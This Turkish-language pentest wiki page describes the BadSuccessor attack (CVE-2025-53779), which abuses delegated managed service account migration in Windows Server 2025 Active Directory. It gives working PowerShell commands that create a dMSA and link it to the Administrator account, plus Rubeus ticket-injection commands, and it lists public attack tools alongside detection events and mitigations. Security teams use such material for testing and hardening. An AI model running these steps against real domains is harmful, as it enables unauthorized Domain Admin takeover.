# BadSuccessor: Delegated MSA Migration Abuse ile Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Delegated Managed Service Accounts (**dMSA**), Windows Server 2025 ile sunulan **gMSA**'nın yeni nesil halefidir. Meşru bir migration workflow, yöneticilerin *eski* bir hesabı (user, computer veya service account) bir dMSA ile değiştirmesine ve permissions'ın şeffaf biçimde korunmasına olanak tanır. Workflow, `Start-ADServiceAccountMigration` ve `Complete-ADServiceAccountMigration` gibi PowerShell cmdlet'leri aracılığıyla sunulur ve **dMSA object**'inin iki LDAP attribute'una dayanır:

* **`msDS-ManagedAccountPrecededByLink`** – yerini alan (eski) account'a giden *DN link*.
* **`msDS-DelegatedMSAState`**       – migration state (`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>

Bir attacker bir OU içinde **herhangi** bir dMSA oluşturabilir ve bu 2 attribute'u doğrudan değiştirebilirse, LSASS ve KDC dMSA'yı linked account'un *successor*'ı olarak kabul eder. Attacker daha sonra dMSA olarak authenticate olduğunda, **linked account'un tüm privileges'larını devralır** – Administrator account linked ise **Domain Admin** seviyesine kadar.<sup>[[1]](#references)</sup>

Bu technique, 2025 yılında Unit 42 tarafından **BadSuccessor** olarak adlandırıldı. Microsoft daha sonra bu technique'e **CVE-2025-53779** atamasını yaptı ve **August 2025**'te bir security update yayımladı. Technique, patch uygulanmamış Windows Server 2025 ortamlarında ve tehlikeli OU delegation incelemelerinde hâlâ önemini korumaktadır.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Attack ön koşulları

1. **Bir Organizational Unit (OU)** içinde object oluşturmaya *izin verilen* ve aşağıdakilerden en az birine sahip bir account:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. LDAP ve Kerberos'a network connectivity (standart domain joined senaryosu / remote attack).<sup>[[1]](#references)</sup>

## Vulnerable OU'ları Enumerate Etme

Unit 42, her OU'nun security descriptor'larını parse eden ve gerekli ACE'leri öne çıkaran bir PowerShell helper script yayımladı:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Arka planda script, `(objectClass=organizationalUnit)` için sayfalandırılmış bir LDAP araması yürütür ve her `nTSecurityDescriptor` için şunları kontrol eder:

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

Yazılabilir bir OU belirlendiğinde saldırı yalnızca 3 LDAP yazma işlemi uzağındadır:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Replikasyonun ardından saldırgan `attacker_dMSA$` olarak **logon** olabilir veya bir Kerberos TGT isteyebilir – Windows, *superseded* hesabın token'ını oluşturur.<sup>[[1]](#references)</sup>

### Otomasyon

Çeşitli public PoC'ler, parola alma ve ticket yönetimi dahil olmak üzere tüm iş akışını kapsar:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Tespit ve Hunting

OU'larda **Object Auditing** özelliğini etkinleştirin ve aşağıdaki Windows Security Event'lerini izleyin:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** nesnesinin oluşturulması
* **5136** – **`msDS-ManagedAccountPrecededByLink`** değişikliği
* **4662** – Belirli attribute değişiklikleri
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA için TGT issuance

`4662` (attribute modification), `4741` (computer/service account oluşturulması) ve `4624` (ardından gerçekleşen logon) olaylarının korelasyonu, BadSuccessor activity'sini hızlıca ortaya çıkarır. **XSIAM** gibi XDR çözümleri kullanıma hazır query'lerle birlikte gelir (references bölümüne bakın).<sup>[[2]](#references)</sup>

## Mitigation

* Microsoft'un **CVE-2025-53779** için yayımladığı security update'i uygulayın ve her Windows Server 2025 domain controller'ın patch level'ını doğrulayın.<sup>[[6]](#references)</sup>
* **least privilege** ilkesini uygulayın – yalnızca *Service Account* management işlemlerini güvenilir rollere delegate edin.
* Açıkça gerektirmeyen OU'lardan `Create Child` / `msDS-DelegatedManagedServiceAccount` izinlerini kaldırın.
* Yukarıda listelenen event ID'lerini izleyin ve *non-Tier-0* identity'lerin dMSA oluşturması veya düzenlemesi durumunda alert oluşturun.

## Ayrıca bkz.


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory'de Privilege Escalation için dMSA Abuse – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Good Accounts Go Bad: Delegated Managed Service Accounts Exploitation](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor modülü](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
